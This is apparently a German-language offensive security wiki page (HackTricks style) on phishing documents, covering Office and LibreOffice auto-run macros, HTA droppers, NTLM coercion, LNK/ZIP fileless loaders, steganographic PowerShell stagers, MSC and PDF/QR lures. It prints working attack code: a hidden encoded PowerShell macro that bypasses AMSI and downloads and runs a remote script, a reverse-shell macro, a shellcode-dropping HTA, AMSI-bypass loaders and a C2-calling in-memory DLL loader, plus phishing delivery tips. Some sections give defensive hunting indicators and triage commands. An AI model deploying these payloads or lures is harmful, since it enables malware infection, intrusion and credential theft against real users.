# Phishing-Dateien und -Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Validierung der Dateidaten durch. Die Datenvalidierung erfolgt in Form einer Identifizierung der Datenstruktur anhand des OfficeOpenXML-Standards. Wenn während der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.

Normalerweise verwenden Word-Dateien, die macros enthalten, die Erweiterung `.docm`. Es ist jedoch möglich, die Datei durch Ändern der Dateierweiterung umzubenennen und ihre Fähigkeiten zur Ausführung von macros beizubehalten.\
Beispielsweise unterstützt eine RTF-Datei standardmäßig keine macros. Eine in RTF umbenannte DOCM-Datei wird jedoch von Microsoft Word verarbeitet und kann macros ausführen.\
Dieselben Interna und Mechanismen gelten für die gesamte Microsoft Office Suite (Excel, PowerPoint usw.).

Mit dem folgenden Befehl kannst du überprüfen, welche Erweiterungen von bestimmten Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf ein Remote-Template verweisen (File –Options –Add-ins –Manage: Templates –Go), das Makros enthält, können Makros ebenfalls „ausführen“.

### Externes Laden von Bildern

Gehe zu: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, und **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Externes Laden von Bildern: Gehe zu: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je häufiger sie vorkommen, desto wahrscheinlicher werden sie vom AV erkannt.

- AutoOpen()
- Document_Open()

#### Macros-Codebeispiele
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadaten manuell entfernen

Gehe zu **Datei > Info > Dokument überprüfen > Dokument überprüfen**, wodurch der Dokumentinspektor geöffnet wird. Klicke auf **Überprüfen** und anschließend neben **Dokumenteigenschaften und persönliche Informationen** auf **Alle entfernen**.

#### Doc-Erweiterung

Wähle anschließend das Dropdown-Menü **Dateityp**, und ändere das Format von **`.docx`** in **Word 97-2003 `.doc`**.\
Der Grund dafür ist, dass du **Makros nicht in einer `.docx` speichern kannst** und die **makrofähige `.docm`**-Erweiterung **stigmatisiert** ist (z. B. hat das Vorschaubild ein großes `!`, und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **veraltete `.doc`-Erweiterung der beste Kompromiss**.

#### Generatoren für schädliche Makros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice-ODT-Auto-Run-Makros (Basic)

LibreOffice-Writer-Dokumente können Basic-Makros einbetten und diese beim Öffnen der Datei automatisch ausführen, indem das Makro an das Ereignis **Open Document** gebunden wird (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Ein einfaches Reverse-Shell-Makro sieht folgendermaßen aus:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Beachte die doppelten Anführungszeichen (`""`) innerhalb des Strings – LibreOffice Basic verwendet sie, um wörtliche Anführungszeichen zu maskieren. Dadurch bleiben Payloads, die mit `...==""")` enden, sowohl beim inneren Befehl als auch beim Shell-Argument korrekt ausbalanciert.

Tipps für die Zustellung:

- Speichere die Datei als `.odt` und verknüpfe das Macro mit dem Dokumentereignis, damit es sofort beim Öffnen ausgeführt wird.
- Verwende beim Senden von E-Mails mit `swaks` `--attach @resume.odt` (das `@` ist erforderlich, damit die Dateibytes und nicht die Dateinamenszeichenkette als Anhang gesendet werden). Dies ist entscheidend, wenn SMTP-Server missbraucht werden, die beliebige `RCPT TO`-Empfänger ohne Validierung akzeptieren.

## HTA Files

Ein HTA ist ein Windows-Programm, das **HTML und scripting languages (wie VBScript und JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und wird als Anwendung mit „vollständigem Vertrauen“ ausgeführt, ohne den Einschränkungen des Sicherheitsmodells eines Browsers zu unterliegen.

Ein HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise zusammen mit **Internet Explorer** installiert wird, wodurch **`mshta` von IE abhängig** ist. Wenn IE deinstalliert wurde, können HTAs daher nicht ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Erzwingen der NTLM-Authentifizierung

Es gibt mehrere Möglichkeiten, die **NTLM-Authentifizierung „remote“ zu erzwingen**. Beispielsweise könntest du **unsichtbare Bilder** in E-Mails oder HTML einfügen, auf die der Benutzer zugreifen wird (sogar HTTP MitM?). Oder du sendest dem Opfer die **Adresse von Dateien**, die bereits beim **Öffnen des Ordners eine Authentifizierung auslösen.**

**Prüfe diese und weitere Ideen auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen, sondern auch **NTLM-Relay-Angriffe durchführen** kannst:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK-Loader + in ZIP eingebettete Payloads (fileless chain)

Hocheffektive Kampagnen liefern eine ZIP-Datei aus, die zwei legitime Köderdokumente (PDF/DOCX) und eine schädliche .lnk-Datei enthält. Der Trick besteht darin, dass der eigentliche PowerShell-Loader nach einem eindeutigen Marker in den Raw-Bytes der ZIP-Datei gespeichert wird und die .lnk-Datei ihn vollständig im Speicher extrahiert und ausführt.<sup>[[2]](#references)</sup>

Typischer Ablauf, der durch den PowerShell-One-Liner in der .lnk-Datei implementiert wird:

1) Die ursprüngliche ZIP-Datei in gängigen Pfaden suchen: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und im übergeordneten Verzeichnis des aktuellen Arbeitsverzeichnisses.
2) Die ZIP-Bytes lesen und nach einem fest codierten Marker suchen (z. B. xFIQCV). Alles nach dem Marker ist die eingebettete PowerShell-Payload.
3) Die ZIP-Datei nach %ProgramData% kopieren, dort extrahieren und die Köder-.docx-Datei öffnen, um einen legitimen Eindruck zu erwecken.
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Die nächste Stufe deobfuskieren (z. B. alle #-Zeichen entfernen) und im Speicher ausführen.

Beispiel für ein PowerShell-Grundgerüst zum Extrahieren und Ausführen der eingebetteten Stufe:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notizen
- Die Zustellung missbraucht häufig seriöse PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads nur bedingt ausliefern (harmlose ZIPs abhängig von IP/UA).
- Die nächste Stufe entschlüsselt häufig base64/XOR-Shellcode und führt ihn über Reflection.Emit + VirtualAlloc aus, um Artefakte auf der Festplatte zu minimieren.

In derselben Chain verwendete Persistence
- COM TypeLib hijacking des Microsoft Web Browser control, sodass IE/Explorer oder jede darin eingebettete Anwendung den Payload automatisch erneut startet.<sup>[[2]](#references)[[4]](#references)</sup> Details und sofort nutzbare Befehle finden Sie hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, die an die Archivdaten angehängte ASCII-Markierungsstrings enthalten (z. B. xFIQCV).
- .lnk-Dateien, die übergeordnete Benutzerordner aufzählen, um die ZIP-Datei zu finden, und ein Täuschungsdokument öffnen.
- AMSI-Manipulation über [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lang laufende Business-Threads, die mit Links unter vertrauenswürdigen PaaS-Domains enden.

## LNK-Decoy-first-Staging → Scheduled-task-Persistence → vertrauenswürdiges CPL-Side-loading

Ein weiteres wiederkehrendes Muster ist ein **ein Dokument imitierendes `.lnk`**, das sofort einen harmlosen Köder öffnet, während es die eigentliche Chain im Hintergrund vorbereitet.<sup>[[3]](#references)</sup>

Beobachteter Ablauf:
1. Die Verknüpfung **tarnt sich als PDF** und verwendet `conhost.exe` oder einen ähnlichen Proxy, um einen obfuskierten PowerShell-Downloader zu starten.
2. PowerShell zerlegt offensichtliche Tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), sodass einfache Erkennungen, die nach `iwr`, `gci`, `ren`, `cpi` oder `schtasks` suchen, den Befehl übersehen.
3. Der Stager lädt zuerst das **Täuschungsdokument** herunter, öffnet es für das Opfer und rekonstruiert anschließend die schädlichen Dateien im Hintergrund.
4. Payloads können mit **zufälligen Erweiterungen** geschrieben und anschließend durch Entfernen von Füllzeichen umbenannt werden, wodurch das Auftreten offensichtlicher `.exe`- / `.cpl`-Artefakte verzögert wird.
5. Persistence wird mit einer **minutenbasierten Scheduled Task** eingerichtet, die eine vertrauenswürdige Host-Binärdatei aus einem durch den Benutzer beschreibbaren Pfad startet.

Minimale Hunting-Hinweise aus diesem Muster:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Ein nützliches Staging-Layout, das man erkennen sollte, ist:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` oder `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Warum die zweite Stufe unauffällig ist

In der Rapid7-Fallstudie startete der Scheduled Task wiederholt **`Fondue.exe`** aus `C:\Users\Public\`. Da **`APPWIZ.cpl`** daneben abgelegt war und **`RunFODW`** exportierte, lud die vertrauenswürdige Microsoft-Binärdatei per side-loading die Angreifer-CPL anstelle der legitimen Systemkopie.

Die CPL:
- Liest einen **AES-256-CBC**-Blob aus `C:\Windows\Tasks\editor.dat`
- Entschlüsselt ihn über **Windows CNG / `bcrypt.dll`**
- Reserviert ausführbaren Speicher und kopiert den entschlüsselten Shellcode hinein
- Führt ihn indirekt aus, indem sie den Shellcode-Zeiger als Callback für **`EnumUILanguagesW`** übergibt

Dieser letzte Schritt sollte separat gesucht werden: Malware vermeidet häufig einen direkten Sprung wie `((void(*)())buf)()` und missbraucht stattdessen eine **legitime Callback-entgegennehmende WinAPI**, um die Ausführung zu übertragen.

Die entschlüsselte Payload in dieser Kampagne war **Donut**-Shellcode. Dieser lud anschließend die finale PE vollständig in den Speicher und patchte **AMSI/WLDP/ETW** im aktuellen Prozess, bevor er die Ausführung übergab. Für weiterführende Hinweise zu side-loading und speicherresidenter Nachbearbeitung siehe:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktische Hunting-Anhaltspunkte:
- `.lnk`, die `powershell.exe` oder `conhost.exe` starten, gefolgt von einem sichtbaren Decoy-Dokument.
- Kurzlebige Downloads nach **`C:\Users\Public\`**, gefolgt von sofortigen Umbenennungen aus unsinnigen Erweiterungen.
- Scheduled Tasks mit unauffälligen Namen wie `GoogleErrorReport`, die aus **benutzerschreibbaren Verzeichnissen** ausgeführt werden.
- Vertrauenswürdige Binärdateien, die **`.cpl` / `.dll`**-Dateien aus demselben Verzeichnis außerhalb des Systems laden.
- Base64-Text-Blob-Dateien, die unter **`C:\Windows\Tasks\`** geschrieben und anschließend vom side-loaded Modul gelesen werden.

## Durch Steganografie abgegrenzte Payloads in Bildern (PowerShell stager)

Aktuelle Loader-Ketten liefern ein obfuskiertes JavaScript/VBS aus, das einen Base64-PowerShell-stager decodiert und ausführt. Dieser stager lädt ein Bild herunter (häufig GIF), das eine Base64-codierte .NET-DLL als Klartext zwischen eindeutigen Start-/End-Markierungen enthält. Das Skript sucht nach diesen Begrenzern (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den Text dazwischen, decodiert ihn per Base64 in Bytes, lädt die Assembly in den Speicher und ruft eine bekannte Einstiegsmethode mit der C2-URL auf.<sup>[[5]](#references)</sup>

Arbeitsablauf
- Stufe 1: Archivierter JS/VBS-dropper → decodiert eingebettetes Base64 → startet den PowerShell-stager mit -nop -w hidden -ep bypass.
- Stufe 2: PowerShell-stager → lädt das Bild herunter, extrahiert Base64 zwischen den Markierungen, lädt die .NET-DLL in den Speicher und ruft ihre Methode auf (z. B. VAI), wobei die C2-URL und Optionen übergeben werden.
- Stufe 3: Der Loader ruft die finale Payload ab und injiziert sie typischerweise per process hollowing in eine vertrauenswürdige Binärdatei (häufig MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Mehr über process hollowing und die Proxy-Ausführung über vertrauenswürdige Utilities gibt es hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-Beispiel zum Extrahieren einer DLL aus einem Bild und Aufrufen einer .NET-Methode im Speicher:

<details>
<summary>PowerShell-Stego-Payload-Extractor und -Loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Hinweise
- Dies ist ATT&CK T1027.003 (Steganografie/Marker-Hiding).<sup>[[6]](#references)</sup> Marker unterscheiden sich je nach Kampagne.
- AMSI/ETW bypass und String-Deobfuscation werden häufig vor dem Laden der Assembly angewendet.
- Hunting: Heruntergeladene Bilder auf bekannte Delimiter scannen; PowerShell identifizieren, das auf Bilder zugreift und unmittelbar Base64-Blobs decodiert.

Siehe auch Stego-Tools und Carving-Techniken:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS-Droppers → Base64-PowerShell-Staging

Eine wiederkehrende Initialstufe ist eine kleine, stark obfuskierte `.js`- oder `.vbs`-Datei, die innerhalb eines Archivs zugestellt wird. Ihr einziger Zweck besteht darin, einen eingebetteten Base64-String zu decodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stufe über HTTPS zu laden.<sup>[[5]](#references)</sup>

Skelettlogik (abstrakt):
- Eigenen Dateiinhalt lesen
- Einen Base64-Blob zwischen Junk-Strings lokalisieren
- In ASCII-PowerShell decodieren
- Mit `wscript.exe`/`cscript.exe` ausführen und dabei `powershell.exe` aufrufen

Hunting-Indikatoren
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Kommandozeile starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus Benutzer-Temp-Pfaden startet.

## MSC-Dokumente als Ausführungscontainer (GrimResource)

Microsoft Management Console-Dateien (`.msc`) sind XML-Konsolendefinitionen, die normalerweise von `mmc.exe` geöffnet werden. **GrimResource** missbraucht eine `StringTable`-Referenz auf eine `apds.dll`-Ressource, die ein altes XSS-Primitive enthält. Dadurch wird JavaScript innerhalb von `mmc.exe` ausgeführt, wenn ein Benutzer die manipulierte Konsole öffnet. Beobachtete Samples kombinierten eine auf `transformNode` basierende Obfuscation mit **DotNetToJScript**, um einen .NET-Payload ohne den üblichen Office-Macro-Pfad zu instanziieren.<sup>[[9]](#references)</sup>

Für die statische Triage sollte eine nicht vertrauenswürdige MSC als Text behandelt und **nicht doppelt angeklickt** werden:<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
Aussagekräftige Laufzeitindikatoren sind, dass `mmc.exe` die CLR oder Script-Komponenten lädt, Netzwerkverbindungen herstellt oder `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` oder eine unerwartete ausführbare Datei startet. Das Format ist legitim, daher sollten Detections **Herkunft + verdächtigen XML-/Script-Inhalt + das Verhalten von `mmc.exe`** korrelieren, anstatt jede MSC zu blockieren.<sup>[[9]](#references)</sup>

## PDF/QR-Redirectors und Payload-Gating

Ein PDF benötigt keinen Exploit, um nützlich zu sein. Aktuelle Kampagnen platzieren einen **QR-Code oder gewöhnlichen Link** in einem harmlos wirkenden Dokument, leiten die Browser-Sitzung von den Mail-Kontrollen weg und personalisieren das Ziel anhand der Empfängeradresse. Microsoft dokumentierte 2025 PDFs, deren QR-URLs pro Empfänger eindeutig waren und zu RaccoonO365-Infrastrukturen für den Diebstahl von Zugangsdaten führten; eine parallele Chain nutzte IP-/Umgebungs-Gating, um ausgewählten Besuchern einen JavaScript-/MSI-Pfad, Scannern oder nicht zugelassenen Clients dagegen ein harmloses PDF bereitzustellen.<sup>[[10]](#references)</sup>

Prüfe sowohl PDF-Aktionen als auch gerenderte QR-Codes. Ein QR-Code kann als Vektor gezeichnet sein, statt als extrahierbares Bild gespeichert zu werden. Rastere daher jede Seite und extrahiere zusätzlich eingebettete Bilder:
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
Untersuche decodierte Ziele und Weiterleitungen von einem isolierten Analysesystem aus, ohne dich zu authentifizieren. Nützliche Merkmale für die Suche sind PDFs, die ausschließlich einen QR-Code enthalten, mit nahezu leeren Mailtexten, die in einem Query-Parameter eingebettete Empfänger-E-Mail-Adresse, mehrere Weiterleitungen über seriöse Hosting-Anbieter sowie unterschiedliche Inhalte abhängig von IP-Adresse, Geolocation, Cookies, Referrer oder User-Agent. Vergleiche Requests mit kontrollierten Profilen, da ein einzelner Sandbox-Abruf möglicherweise nur den Köder erhält.<sup>[[10]](#references)</sup>

## Windows-Dateien zum Stehlen von NTLM hashes

Siehe die Seite über **Orte zum Stehlen von NTLM-Creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-Kampagne: Ein ausgefeilter Phishing-Angriff auf US-Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Verfolgung der Tradecraft von Dropping Elephant durch eine China-themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Neue COM-Persistence-Technik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader liefert eine Reihe von Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console für initialen Zugriff und Evasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat Actors nutzen die Steuersaison zur Verbreitung von Phishing-Kampagnen mit Steuerthematik](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
